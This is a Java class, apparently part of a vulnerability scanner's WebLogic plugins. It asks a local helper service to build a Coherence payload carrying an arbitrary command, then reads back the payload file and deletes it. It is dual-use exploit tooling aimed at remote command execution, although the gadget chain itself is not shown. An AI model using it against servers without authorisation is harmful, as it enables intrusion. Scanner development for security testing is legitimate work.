package com.gbw.scanner.plugins.scripts.weblogic;

import com.gbw.scanner.http.GBWHttpClientBuilder;
import com.gbw.scanner.http.GBWHttpGetRequestBuilder;
import com.gbw.scanner.http.GBWHttpResponse;
import com.gbw.scanner.utils.FileUtils;
import com.gbw.scanner.utils.GsonUtils;
import com.gbw.scanner.utils.HttpUtils;
import org.apache.http.client.methods.HttpGet;
import org.apache.http.impl.client.CloseableHttpClient;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;

public class GBWCoherenceClient {

    public static final byte[] makePayload(String host,int port,String version,String cmd){

        CloseableHttpClient httpClient = null;
        HttpGet httpGet = null;
        GBWHttpResponse httpResponse = null;
        RequestEntry requestEntry = new RequestEntry();
        requestEntry.setCmd(cmd);
        requestEntry.setVersion(version);
        String url = String.format("/?content=%s",GsonUtils.toJson(requestEntry,true));
        byte[] result = null;

        try {

            httpClient = GBWHttpClientBuilder.make("http",port);
            httpGet = new GBWHttpGetRequestBuilder("http",host,port,url)
            .build();

            httpResponse = HttpUtils.send(httpClient,httpGet,true);

            if(httpResponse.getStatus() == 200) {
                PayloadEntry payloadEntry = GsonUtils.loadConfigFromJson(httpResponse.getContent(), PayloadEntry.class);
                result = Files.readAllBytes(Paths.get(payloadEntry.getFpath()));
                FileUtils.delete(payloadEntry.getFpath());
            }

        }catch (Exception e){
            e.printStackTrace();
        }finally {
            if(httpClient!=null) {
                try {
                    httpClient.close();
                } catch (IOException e) {
                    e.printStackTrace();
                }
            }
        }

        return result;
    }

    private static class RequestEntry{
        private String version;
        private String cmd;

        public String getVersion() {
            return version;
        }

        public void setVersion(String version) {
            this.version = version;
        }

        public String getCmd() {
            return cmd;
        }

        public void setCmd(String cmd) {
            this.cmd = cmd;
        }
    }

    private class PayloadEntry {

        private String version;
        private String fpath;


        public String getVersion() {
            return version;
        }

        public void setVersion(String version) {
            this.version = version;
        }

        public String getFpath() {
            return fpath;
        }

        public void setFpath(String fpath) {
            this.fpath = fpath;
        }
    }

}
